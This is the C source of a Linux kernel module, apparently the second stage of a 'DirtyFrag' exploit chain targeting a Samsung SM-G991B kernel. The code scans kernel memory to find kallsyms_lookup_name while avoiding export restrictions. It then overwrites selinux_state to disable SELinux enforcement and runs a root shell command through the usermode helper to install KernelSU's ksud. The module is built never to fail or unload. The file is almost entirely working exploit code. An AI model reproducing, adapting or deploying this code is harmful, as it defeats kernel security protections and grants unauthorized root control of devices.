/* df_final: complete DirtyFrag second stage for SM-G991B/HZC2 (5.4.242).
 *
 * All o1s/HZC2 lessons baked in:
 *  - imports ONLY printk (proven) + sprint_symbol + UMH pair (all ancient,
 *    CRC-stable). No kprobe/kallsyms/text-section assumptions beyond reads.
 *  - anchor: &sprint_symbol is the module PLT stub; follow B-hop(s) to the
 *    real function (validated: stub 0x17ced555-class B insn), self-check via
 *    sprint_symbol name match, then +-4MB scan (kln sits 2.7KB away).
 *  - NEVER fail init (HZC2 unload path hangs): all failures degrade to a
 *    resident no-op. Success signal is dfm0 (ksud) + getenforce.
 *  - UMH: /system/bin/sh -c "<ksud> late-load ... && touch /dev/dfm0 ||
 *    touch /dev/dfm1" (markers via shell, no kernel file writes needed).
 */
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/gfp.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/umh.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("IonStack_S21");
MODULE_DESCRIPTION("DirtyFrag full second stage, o1s-hardened (HZC2)");

extern int sprint_symbol(char *buffer, unsigned long address);

static int soft_reboot;
module_param(soft_reboot, int, 0400);

typedef unsigned long (*kln_t)(const char *name);
typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp,
			     unsigned long gfp, void *init, void *cleanup,
			     void *data);
typedef int (*umh_exec_t)(void *sub_info, int wait);

#define SCAN_STRIDE	4UL
#define SCAN_MAX	(4UL * 1024UL * 1024UL / SCAN_STRIDE)

static int name_is(const char *buf, const char *want)
{
	int i;

	for (i = 0; want[i]; i++) {
		if (buf[i] != want[i])
			return 0;
	}
	return buf[i] == '+' && buf[i + 1] == '0' && buf[i + 2] == 'x' &&
	       buf[i + 3] == '0' && buf[i + 4] == '/';
}

/* Follow a single ARM64 B instruction; 0 if not a B. */
static unsigned long follow_b(unsigned long addr)
{
	unsigned int insn = *(volatile unsigned int *)addr;
	long off;

	if ((insn & 0xfc000000) != 0x14000000)
		return 0;
	off = (long)(insn & 0x3ffffff);
	if (off & (1L << 25))
		off -= (1L << 26);
	return addr + off * 4;
}

static unsigned long scan_one_dir(unsigned long start, int dir,
				  int (*klprintf)(const char *fmt, ...))
{
	static char buf[256];
	unsigned long a;
	unsigned long i;
	(void)klprintf;

	for (i = 0; i < SCAN_MAX; i++) {
		unsigned long j;

		if (dir < 0) {
			if (start < (i + 1) * SCAN_STRIDE)
				break;
			a = start - (i + 1) * SCAN_STRIDE;
		} else {
			a = start + (i + 1) * SCAN_STRIDE;
		}
		for (j = 0; j < sizeof(buf); j++)
			buf[j] = 0;
		sprint_symbol(buf, a);
		if (name_is(buf, "kallsyms_lookup_name"))
			return a;
	}
	return 0;
}

typedef struct file *(*filp_open_t)(const char *, int, int);
typedef long (*kernel_write_t)(struct file *, const void *, size_t,
			       long long *);
typedef int (*filp_close_t)(struct file *, void *);

static filp_open_t r_filp_open;
static kernel_write_t r_kernel_write;
static filp_close_t r_filp_close;

static void mark(const char *path)
{
	struct file *f;
	long long pos = 0;
	char c = '1';

	if (!r_filp_open || !r_kernel_write || !r_filp_close)
		return;
	f = r_filp_open(path, 0x41 /*O_WRONLY|O_CREAT*/, 0644);
	if (!f || (long)f < 0)
		return;
	r_kernel_write(f, &c, 1, &pos);
	r_filp_close(f, 0);
}

static int umh_init(struct subprocess_info *info, struct cred *new)
{
	(void)info;
	(void)new;
	return 0;
}

static int __init dff_init(void)
{
	unsigned long anchor = (unsigned long)&sprint_symbol;
	unsigned long real, found = 0, sstate;
	kln_t kln = 0;
	static char cmd0[] = "/data/user_de/0/df.root/ksud late-load"
		" --package-name me.weishu.kernelsu --ro-partitions"
		" && touch /dev/dfm0 || touch /dev/dfm1";
	static char cmd1[] = "/data/user_de/0/df.root/ksud late-load"
		" --package-name me.weishu.kernelsu --ro-partitions --soft-reboot"
		" && touch /dev/dfm0 || touch /dev/dfm1";
	static char *argv0[] = {
		(char *)"/system/bin/sh", (char *)"-c", cmd0, NULL
	};
	static char *argv1[] = {
		(char *)"/system/bin/sh", (char *)"-c", cmd1, NULL
	};
	static char *envp[] = {
		(char *)"HOME=/",
		(char *)"PATH=/sbin:/vendor/bin:/system/bin",
		NULL
	};
	struct subprocess_info *sub;
	unsigned long setup_addr, exec_addr;
	umh_setup_t umh_setup;
	umh_exec_t umh_exec;
	int rc;

	/* hop 1: module PLT stub -> kernel stub; hop 2: stub -> real fn */
	real = follow_b(anchor);
	if (real)
		real = follow_b(real);
	if (!real)
		real = anchor;
	{
		static char buf[256];
		unsigned long k;

		for (k = 0; k < sizeof(buf); k++)
			buf[k] = 0;
		sprint_symbol(buf, real);
		if (!name_is(buf, "sprint_symbol"))
			goto done;
	}
	found = scan_one_dir(real, -1, printk);
	if (!found)
		found = scan_one_dir(real, +1, printk);
	if (!found)
		goto done;
	kln = (kln_t)found;
	{

		sstate = kln("selinux_state");
		r_filp_open = (filp_open_t)kln("filp_open");
		r_kernel_write = (kernel_write_t)kln("kernel_write");
		r_filp_close = (filp_close_t)kln("filp_close");
		if (!sstate)
			goto done;
		*(volatile unsigned char *)sstate = 0;
		__asm__ volatile("dsb sy" ::: "memory");
		pr_info("dff: permissive set\n");
		mark("/dev/dfS1");
	}
	setup_addr = kln("call_usermodehelper_setup");
	exec_addr = kln("call_usermodehelper_exec");
	if (!setup_addr || !exec_addr) {
		pr_info("dff: umh unresolved %lx %lx\n", setup_addr, exec_addr);
		goto done;
	}
	umh_setup = (umh_setup_t)setup_addr;
	umh_exec = (umh_exec_t)exec_addr;
	sub = umh_setup("/system/bin/sh",
			soft_reboot ? argv1 : argv0, envp,
			0xcc0u /* GFP_KERNEL */, umh_init, 0, 0);
	if (!sub)
		goto done;
	mark("/dev/dfS2");
	rc = umh_exec(sub, 2 /* UMH_WAIT_PROC */);
	pr_info("dff: umh_exec rc=%d\n", rc);
	mark("/dev/dfS3");
done:
	/* Always resident: HZC2 unload-after-error hangs. */
	return 0;
}

module_init(dff_init);
